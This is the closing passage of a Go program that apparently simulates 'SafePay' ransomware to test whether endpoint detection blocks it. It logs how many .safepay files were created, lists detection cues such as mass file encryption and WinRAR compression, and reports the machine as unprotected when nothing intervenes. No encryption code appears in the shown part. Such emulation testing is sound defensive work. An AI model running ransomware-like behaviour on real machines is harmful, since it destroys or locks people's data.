			logMessage("SUCCESS", fmt.Sprintf("  ... and %d more .safepay files", len(safepayFiles)-5))
		}
	} else {
		logMessage("ERROR", "No .safepay files were created! This indicates a problem with the encryption phase.")
	}
	
	logMessage("INFO", "EDR Detection Opportunities:")
	logMessage("INFO", "  - Mass file creation in user directory")
	logMessage("INFO", "  - Multiple WinRAR compression processes")  
	logMessage("INFO", "  - Selective file deletion patterns")
	logMessage("INFO", "  - File encryption with suspicious extensions (.safepay)")
	logMessage("INFO", "  - Go binary execution with ransomware behavior")
	
	logMessage("SUCCESS", fmt.Sprintf("Simulation log saved to: %s", simState.LogFile))
	logMessage("SUCCESS", "=================================================================================")
	logMessage("SUCCESS", "SafePay Go-Native Ransomware Simulation completed!")
	logMessage("SUCCESS", "=================================================================================")

	Endpoint.Say("Go-native ransomware simulation execution was not prevented")
	Endpoint.Say("All ransomware behaviors executed successfully in pure Go")
	Endpoint.Stop(Endpoint.Unprotected)
}

func main() {
	// CUSTOM RUNNER: Bypass Endpoint.Start() to avoid 30-second timeout limitation
	Endpoint.Say("Starting Go-native test at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("Using custom runner with extended timeout for comprehensive simulation")
	
	// Run test with custom timeout
	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()
	
	// Wait for test completion or timeout (5 minutes)
	select {
	case <-done:
		Endpoint.Say("Test completed within timeout window")
	case <-time.After(5 * time.Minute):
		Endpoint.Say("Test timed out after 5 minutes")
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}